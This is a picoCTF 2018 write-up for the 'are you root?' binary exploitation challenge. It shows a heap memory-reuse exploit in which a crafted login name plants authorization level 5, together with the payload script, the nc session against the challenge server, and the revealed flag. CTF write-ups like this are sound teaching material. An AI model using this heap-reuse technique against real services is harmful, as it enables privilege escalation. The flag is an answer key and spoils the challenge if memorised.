# are you root?
Binary Exploitation - 550 points

## Challenge 
> Can you get root access through this [service](auth) and get the flag? Connect with nc 2018shell2.picoctf.com 29508. [Source.](auth.c)

## Hint
> If only the program used calloc to zero out the memory..


## Solution

We can only get the flag if the level is exactly 5.

The level can be manipulated if we overflow the name as such...

	$ nc 2018shell2.picoctf.com 29508
	
	Available commands:
		show - show your current user and authorization level
		login [name] - log in as [name]
		set-auth [level] - set your authorization level (must be below 5)
		get-flag - print the flag (requires authorization level 5)
		reset - log out and reset authorization level
		quit - exit the program

	Enter your command:
	> login aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaaf
	Logged in as "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafb"

	Enter your command:
	> show
	Logged in as aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafb [0]

	Enter your command:
	> reset
	Logged out!

	Enter your command:
	> login A
	Logged in as "A"

	Enter your command:
	> show
	Logged in as A [1633771875]

	Enter your command:
	> get-flag
	Must have authorization level 5.

From this, we see that `1633771875` = `0x61616163` or `caaa` can be used to replace with the level 5

	Level = 0x00000005 or '\x05\x00\x00\x00'

	Hence, username = 'aaaabaaa\x05\x00\x00\x00'

Hence, we can now get our flag

	 $ python -c "print 'login aaaabaaa\x05\x00\x00\x00'" > payload.txt
	 $ python -c "print 'show'" >> payload.txt
	 $ python -c "print 'reset'" >> payload.txt
	 $ python -c "print 'login A'" >> payload.txt
	 $ python -c "print 'show'" >> payload.txt
	 $ python -c "print 'get-flag'" >> payload.txt
	 $ cat payload.txt - | nc 2018shell2.picoctf.com 29508
	Available commands:
		show - show your current user and authorization level
		login [name] - log in as [name]
		set-auth [level] - set your authorization level (must be below 5)
		get-flag - print the flag (requires authorization level 5)
		reset - log out and reset authorization level
		quit - exit the program

	Enter your command:
	> Logged in as "aaaabaaa"

	Enter your command:
	> Logged in as aaaabaaa [0]

	Enter your command:
	> Logged out!

	Enter your command:
	> Logged in as "A"

	Enter your command:
	> Logged in as A [5]

	Enter your command:
	> picoCTF{m3sS1nG_w1tH_tH3_h43p_a5e65af1}


## Flag

	picoCTF{m3sS1nG_w1tH_tH3_h43p_a5e65af1}
